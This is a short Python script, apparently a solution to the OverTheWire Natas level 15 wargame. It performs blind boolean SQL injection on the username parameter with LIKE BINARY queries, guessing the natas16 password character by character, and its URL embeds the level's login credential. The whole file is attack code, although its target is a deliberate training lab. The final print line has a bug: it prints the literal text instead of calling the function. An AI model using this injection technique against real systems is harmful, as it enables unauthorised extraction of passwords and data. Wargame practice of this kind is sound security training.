import string
import requests

POSSIBLE_CHARS = string.ascii_letters + string.digits
URL = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'

def sql_inject_password():
    password = ''
    
    # Because all natas passwords were 32 char long
    for i in range(32): 
        for char in POSSIBLE_CHARS:
            sql = f'{URL}?username=natas16" AND password LIKE BINARY "{password}{char}%'
            if 'This user exists.' in requests.get(sql).text:
                password += char
                break

    return password

if __name__ == '__main__':
    if requests.get(URL).status_code == requests.codes.ok:
        print(f"Password = sql_inject_password()")
